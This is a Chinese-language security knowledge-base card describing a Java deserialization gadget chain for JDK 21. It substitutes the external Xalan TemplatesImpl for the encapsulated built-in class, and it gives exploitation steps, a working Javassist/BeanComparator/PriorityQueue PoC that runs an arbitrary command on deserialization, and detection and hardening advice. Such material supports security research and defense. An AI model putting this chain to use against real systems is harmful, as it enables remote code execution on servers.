---
id: web-java-deserialization-external-xalan-templatesimpl-sink
title: JDK 21 下用外部 Xalan-J TemplatesImpl 替代被封装的 Sink
type: scenario
domain: web
path: web/java/deserialization
technique: external-xalan-templatesimpl-sink
tags:
- java
- deserialization
- templatesimpl
- xalan
- commons-beanutils
- comparator
- jdk21
- rce
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-04'
updated: '2026-11-05'
affected_versions: JDK 17+（模块强封装）；需 classpath 含 xalan:xalan:2.7.3；原文测试 JDK 21.0.11-ea + Spring Boot 3.2.5
verification:
  verified_by: verifier-V7
  verified_at: '2026-11-05T00:41:52+08:00'
  notes: 已对照原文核对：JDK 21 内置 com.sun.org.apache.xalan...TemplatesImpl 的 _bytecodes 反射失败（截图 07 实测 InaccessibleObjectException）、外部 xalan:xalan:2.7.3 的 org.apache.xalan...TemplatesImpl 位于 unnamed module、CB1 BeanComparator(outputProperties)+PriorityQueue 链代码与字段设置一致；未验证点：原文仅给完整代码，无该链实际执行输出，medium 合适；xalan 2.7.3/JDK21 为依赖与测试环境
url: /docs/web/java/deserialization/web-java-deserialization-external-xalan-templatesimpl-sink/
draft: false
kb_aliases:
- 外部 Xalan TemplatesImpl
- Post-TemplatesImpl
- xalan:xalan gadget
- CB1 外部 Xalan
- JDK 21 TemplatesImpl 替代
---

## 一句话结论

JDK 21 的模块强封装使 `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` 的 `_bytecodes` 无法反射写入、经典链失效；但若应用 classpath 引入独立 `xalan:xalan`，其 `org.apache.xalan.xsltc.trax.TemplatesImpl` 位于未命名模块，字段可正常反射，可直接承接 `BeanComparator` + `PriorityQueue` 的 CB1 链实现 RCE。

## 原理

- JDK 内置 `TemplatesImpl` 位于 `java.xml` 模块的非导出包 `com.sun.org.apache.xalan.internal.xsltc.trax`，JDK 21 默认未 `opens`，`Field.setAccessible(true)` 抛 `InaccessibleObjectException`，依赖它的 gadget 链在反射赋值阶段断裂。
- Maven 坐标 `xalan:xalan` 提供同源实现的独立 JAR，类名为 `org.apache.xalan.xsltc.trax.TemplatesImpl`，作为普通 classpath JAR 处于未命名模块，不受 JDK 模块 `opens` 限制，`_bytecodes`、`_name`、`_tfactory` 均可反射写入。
- 该类保留相同的危险行为：`getOutputProperties()` → `newTransformer()` → 加载 `_bytecodes` 中的字节码并实例化（需继承 `org.apache.xalan.xsltc.runtime.AbstractTranslet`），静态初始化块在类加载时执行。
- 触发链：`PriorityQueue.readObject()` 重建堆时调用 `comparator.compare(a,b)`；`BeanComparator("outputProperties")` 内部用 `PropertyUtils.getProperty(target, "outputProperties")` 反射调用 getter → `TemplatesImpl.getOutputProperties()` → 字节码执行。
- 与 JDK 内置版本的关键差异不是利用原理，而是**类的模块归属**：外部 JAR 在 classpath 上，模块封装完全不介入。

## 触发条件

- 目标为 JDK 17+，JDK 内置 `TemplatesImpl` 已被强封装阻断。
- classpath 中存在 `xalan:xalan`（原文用 2.7.3）以及 `commons-beanutils`（提供 `BeanComparator`）。
- 存在 Java 原生反序列化入口，且过滤器未拦截 `org.apache.xalan.**`、`org.apache.commons.beanutils.**` 等类。
- 攻击侧可用 Javassist/ASM 生成继承外部 `AbstractTranslet` 的恶意字节码。

## 利用步骤

1. 用 Javassist 生成类，父类设为 `org.apache.xalan.xsltc.runtime.AbstractTranslet`，在类初始化器中写入命令执行。
2. 实例化 `org.apache.xalan.xsltc.trax.TemplatesImpl`，反射设置 `_bytecodes`（二维字节数组）、`_name`（非 null）、`_tfactory`（`TransformerFactoryImpl` 实例）。
3. 构造 `BeanComparator("outputProperties")`，放入 `PriorityQueue`；先用无害元素填充，避免本地触发。
4. 反射把 `PriorityQueue.queue` 替换为两个恶意 `templates` 元素。
5. 序列化 `PriorityQueue` 并发送到目标；反序列化重建堆时触发 compare → getter → 字节码执行。
6. 若目标无 `commons-beanutils`，可换其他能触发 `getOutputProperties()` 的 Getter 链（如 Jackson `POJONode`）。

## PoC

```java
// 依赖：commons-beanutils:1.9.4, xalan:xalan:2.7.3, javassist
ClassPool pool = ClassPool.getDefault();
CtClass ct = pool.makeClass("Evil_" + System.currentTimeMillis());
ct.setSuperclass(pool.get("org.apache.xalan.xsltc.runtime.AbstractTranslet"));
ct.makeClassInitializer().insertBefore(
    "java.lang.Runtime.getRuntime().exec(\"" + command + "\");");
byte[] bytecode = ct.toBytecode();

Object templates = Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl")
    .getDeclaredConstructor().newInstance();
setField(templates, "_bytecodes", new byte[][]{bytecode});
setField(templates, "_name", "anything");
setField(templates, "_tfactory",
    Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl")
         .getDeclaredConstructor().newInstance());

BeanComparator<Object> cmp = new BeanComparator<>("outputProperties");
PriorityQueue<Object> queue = new PriorityQueue<>(2, cmp);
queue.add("1"); queue.add("2");
setField(queue, "queue", new Object[]{templates, templates});

// 序列化 queue 即为 payload
```

`setField` 用 `getDeclaredField` + `setAccessible(true)`；因外部 Xalan 在未命名模块，这一步不会抛 `InaccessibleObjectException`。

## 变体与关联

- 变体：`xalan:xalan` 2.7.3 是常见传递依赖（XML/XSLT 处理、报表、旧框架），无需攻击者上传；只要在 classpath 即可能被利用。
- 变体：除 `BeanComparator` 外，任何能反射调用 `getOutputProperties()` 的链都可承接，如 Jackson `POJONode`、`ToStringBean` 等。
- 关联：JDK 内置 `TemplatesImpl` 失效是 JDK 17+ 模块强封装的结果；同一原因也推动攻击面转向 JDBC 连接串与 JNDI。
- 关联卡片：[[web-java-deserialization-jdk-signedobject-nested-stream-filter-bypass]]、[[web-java-deserialization-h2-jdbc-init-create-alias-rce]]

## 检测与防御

- 检测：依赖树中出现 `xalan:xalan`（尤其 2.7.x）；classpath 中存在 `org.apache.xalan.xsltc.trax.TemplatesImpl`。
- 检测：序列化流中出现 `org.apache.xalan.xsltc.trax.TemplatesImpl`、`com.sun.org.apache.xalan...AbstractTranslet` 子类、`BeanComparator`、`PriorityQueue` 组合。
- 检测：反序列化阶段加载未知类、类初始化器执行外部命令。
- 修复：移除不必要的 `xalan:xalan`，改用 JDK 内置 XML 处理；无法移除时升级到无该 gadget 的版本并做依赖治理。
- 加固：反序列化白名单只允许业务类，拒绝 `org.apache.xalan.**`、`org.apache.commons.beanutils.**`；不要为兼容性添加 `--add-opens java.xml/...`；优先消除 Java 原生反序列化入口。
- 注意：仅靠 JDK 模块封装不能防御此链，因为外部 JAR 不受模块 `opens` 约束。
